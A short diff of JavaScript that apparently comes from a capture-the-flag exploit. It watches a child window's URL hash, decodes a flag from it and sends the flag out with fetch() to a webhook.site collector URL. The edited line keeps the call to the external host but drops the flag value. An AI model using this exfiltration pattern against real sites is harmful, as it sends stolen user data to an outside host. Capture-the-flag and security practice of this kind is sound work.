@@ -8,7 +8,7 @@
       if (hash.startsWith('#:')) {
         clearInterval(interval);
         const flag = atob(hash.slice(2)).split(':')[1];
-        fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=' + encodeURIComponent(flag));
+        fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=' );
         child.close();
       }
     } catch {}
